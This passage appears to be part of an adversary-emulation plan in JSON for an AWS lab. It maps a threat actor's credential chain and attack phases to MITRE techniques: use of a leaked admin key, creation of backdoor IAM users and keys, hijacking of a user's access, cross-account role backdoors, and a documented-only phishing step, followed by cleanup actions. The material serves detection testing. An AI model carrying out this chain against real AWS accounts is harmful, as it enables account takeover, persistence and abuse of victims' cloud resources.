+      "description": "DOCUMENTED ONLY — Cannot safely emulate: ses:SendEmail to real external recipients is illegal and harms third parties. Script calls ses:VerifyEmailIdentity on the lab-controlled identity and logs the SendEmail CloudTrail event structure. SES sandbox mode is enforced on the lab account — any accidental SendEmail call would be blocked from external delivery.",
+      "implementation": {
+        "method": "boto3 SES client using alice_hijacked_key session; VerifyEmailIdentity is called; SendEmail structure is logged to stdout without API execution",
+        "credential_source": "alice_hijacked_key",
+        "api_calls": [
+          {"service": "ses", "method": "verify_email_identity", "args": {"EmailAddress": "emulation-noreply@emulation-lab-noreply.example.com"}}
+        ],
+        "simulated_call": {
+          "service": "ses",
+          "method": "send_email",
+          "args": {
+            "Source": "emulation-noreply@emulation-lab-noreply.example.com",
+            "Destination": {"ToAddresses": ["[SANDBOX-VERIFIED-RECIPIENT-ONLY]"]},
+            "Message": {"Subject": {"Data": "[PHISHING-SIMULATION — NOT SENT]"}, "Body": {"Text": {"Data": "[PHISHING-BODY-REDACTED]"}}}
+          }
+        }
+      },
+      "expected_audit_events": [
+        {"eventName": "VerifyEmailIdentity", "eventSource": "ses.amazonaws.com"},
+        {"eventName": "SendEmail", "eventSource": "ses.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["ses:DeleteIdentity for emulation-noreply@emulation-lab-noreply.example.com — done in cleanup_manifest"],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "SES email identity created from anomalous IAM principal (alice.chen hijacked session)",
+        "SendEmail API call from SES sandbox account — external delivery blocked, CloudTrail event still generated",
+        "AWS Trust & Safety abuse notification pattern (would trigger in live SES production mode)"
+      ]
+    }
+  ],
+  "credential_chain": [
+    {
+      "id": "leaked_admin_key",
+      "phase": 1,
+      "source": "Long-term IAM access key for lab-infra-admin (AdministratorAccess) embedded as plaintext in infra/prod/terraform.tfstate JSON in dangerdev-leaked-creds-bucket — simulates accidentally exposed credential in external storage",
+      "technique": "T1078.004",
+      "type": "static_key",
+      "session_name": "leaked_admin_session",
+      "used_in_phases": [1],
+      "expiration": "long-term (no expiry — rotated and deleted in cleanup_manifest post-emulation)"
+    },
+    {
+      "id": "dangerdev_user_key",
+      "phase": 1,
+      "source": "iam:CreateAccessKey called on DangerDev@protonmail.me during T1136.003 step 4; returned AccessKeyId and SecretAccessKey stored in CredentialStore as dangerdev_session and used for all Phase 2 and Phase 3 API calls",
+      "technique": "T1136.003",
+      "type": "static_key",
+      "session_name": "dangerdev_session",
+      "used_in_phases": [2, 3],
+      "expiration": "long-term (deleted in T1070 step 15)"
+    },
+    {
+      "id": "ses_user_key",
+      "phase": 3,
+      "source": "iam:CreateAccessKey called on masquerade user 'ses' during T1036.005 step 10; captured in CredentialStore as ses_masquerade_session — not used for further API calls within attack script (documents DangerDev pattern of creating keys on masquerade accounts)",
+      "technique": "T1036.005",
+      "type": "static_key",
+      "session_name": "ses_masquerade_session",
+      "used_in_phases": [3],
+      "expiration": "long-term (deleted in T1070 step 15)"
+    },
+    {
+      "id": "cross_account_sts",
+      "phase": 3,
+      "source": "sts:AssumeRole targeting AWSeservedSSO_AdminAccess role from adversary lab account (ADVERSARY_LAB_ACCOUNT_ID). Returns AccessDenied when called from victim account in emulation — real execution requires adversary account credentials not present in attack.py",
+      "technique": "T1199",
+      "type": "sts_session",
+      "session_name": "cross_account_backdoor_session",
+      "used_in_phases": [3],
+      "expiration": "short-term (~1 hour, renewable from adversary account)"
+    },
+    {
+      "id": "alice_hijacked_key",
+      "phase": 3,
+      "source": "iam:CreateAccessKey called on existing victim user alice.chen during T1098 step 12; represents post-cleanup persistent access surviving DangerDev@protonmail.me deletion — used for documented-only steps 16 and 17",
+      "technique": "T1098",
+      "type": "static_key",
+      "session_name": "alice_hijacked_session",
+      "used_in_phases": [3],
+      "expiration": "long-term (deleted in cleanup_manifest)"
+    }
+  ],
+  "script_manifest": {
+    "attack_script": "attack.py",
+    "description": "Single unified attack script managing all credential sessions via a CredentialStore dict keyed by credential ID. Initializes leaked_admin_session from LEAKED_KEY_ID + LEAKED_SECRET_KEY env vars. Transitions active session to dangerdev_session after step 5. Captures ses_user_key and alice_hijacked_key as returned credentials from CreateAccessKey calls. Switches to LAB_OPERATOR_KEY boto3 session only for final DangerDev user self-deletion in step 15. Steps 16-17 are documented-only and output simulated CloudTrail JSON without executing API calls.",
+    "entry_point": "main(target_info)",
+    "phases": [
+      {
+        "phase": 1,
+        "name": "Initial Access and Persistence Establishment",
+        "techniques": ["T1078.004", "T1526", "T1087.004", "T1136.003", "T1098.003"],
+        "context": "api_attack"
+      },
+      {
+        "phase": 2,
+        "name": "Infrastructure Discovery and Compute Deployment",
+        "techniques": ["T1580", "T1578.002", "T1021.001", "T1496"],
+        "context": "api_attack + lateral_movement + host_attack"
+      },
+      {
+        "phase": 3,
+        "name": "Persistence Hardening, Collection, Evasion, and Documented Phishing",
+        "techniques": ["T1036.005", "T1199", "T1098", "T1530", "T1518.001", "T1070", "T1583.001", "T1566.002"],
+        "context": "api_attack + phishing_attack"
+      }
+    ]
+  },
+  "cleanup_manifest": {
+    "attack_created_resources": [
+      {"type": "IAM User", "name": "DangerDev@protonmail.me", "cleaned_during_attack": true},
+      {"type": "IAM Access Key", "name": "DangerDev@protonmail.me access key", "cleaned_during_attack": true},
+      {"type": "IAM Login Profile", "name": "DangerDev@protonmail.me console login", "cleaned_during_attack": true},
+      {"type": "IAM Policy Attachment", "name": "AdministratorAccess on DangerDev@protonmail.me", "cleaned_during_attack": true},
+      {"type": "IAM User", "name": "ses (masquerade)", "cleaned_during_attack": true},
+      {"type": "IAM Access Key", "name": "ses user access key", "cleaned_during_attack": true},
+      {"type": "IAM Access Key", "name": "alice.chen second key (TA-created)", "cleaned_during_attack": false},
+      {"type": "IAM Login Profile Password", "name": "alice.chen console password (updated by attack)", "cleaned_during_attack": false},
+      {"type": "EC2 Instance", "name": "dangerdev-test-instance (t2.micro launched in step 7)", "cleaned_during_attack": true},
+      {"type": "IAM Policy Attachment", "name": "AdministratorAccess on AWSeservedSSO_AdminAccess (attached in step 11)", "cleaned_during_attack": false},
+      {"type": "IAM Policy Attachment", "name": "AdministratorAccess on AWSLanding-Zones-ConfigRecorderRoles (attached in step 11)", "cleaned_during_attack": false},
+      {"type": "SES Email Identity", "name": "emulation-noreply@emulation-lab-noreply.example.com", "cleaned_during_attack": false}
+    ],
+    "pulumi_managed_resources": "All infrastructure destroyed by pulumi destroy — dangerdev-sandbox-vpc, dangerdev-internet-gateway, dangerdev-public-subnet, dangerdev-open-sg, dangerdev-ec2-windows-instance, dangerdev-ec2-keypair, dangerdev-ssm-instance-role, dangerdev-ec2-instance-profile, dangerdev-exposed-admin-user, dangerdev-leaked-creds-bucket, dangerdev-decoy-user-alice, dangerdev-decoy-user-ops, dangerdev-honey-iam-user, dangerdev-ses-email-identity, dangerdev-cross-account-backdoor-role, dangerdev-configrecorder-backdoor-role, dangerdev-sensitive-s3-bucket, dangerdev-secretsmanager-secret, dangerdev-guardduty-detector, dangerdev-cloudtrail, dangerdev-log-bucket",
+    "cleanup_order": [
+      "Revoke dangerdev_session and ses_masquerade_session (if not already deleted by T1070 step 15)",
+      "Delete alice.chen TA-created access key (iam:DeleteAccessKey)",
+      "Reset alice.chen console password to original ChangeMe2024! (iam:UpdateLoginProfile)",
+      "Detach AdministratorAccess from AWSeservedSSO_AdminAccess (iam:DetachRolePolicy)",
+      "Detach AdministratorAccess from AWSLanding-Zones-ConfigRecorderRoles (iam:DetachRolePolicy)",
+      "Delete SES email identity emulation-noreply@emulation-lab-noreply.example.com (ses:DeleteIdentity)",
+      "Deactivate and delete lab-infra-admin leaked key (iam:UpdateAccessKey + iam:DeleteAccessKey)",
+      "Confirm no running EC2 instances outside of Pulumi state",
+      "pulumi destroy"
+    ]
+  },
+  "dwell_time_recommendation_seconds": 600,
+  "total_techniques": 17,
+  "total_attack_steps": 17,
+  "mitre_tactics_covered": [
+    "Initial Access",
+    "Discovery",
+    "Persistence",
+    "Privilege Escalation",
+    "Defense Evasion",
+    "Lateral Movement",
+    "Impact",
+    "Collection",
+    "Resource Development"
+  ]
+}
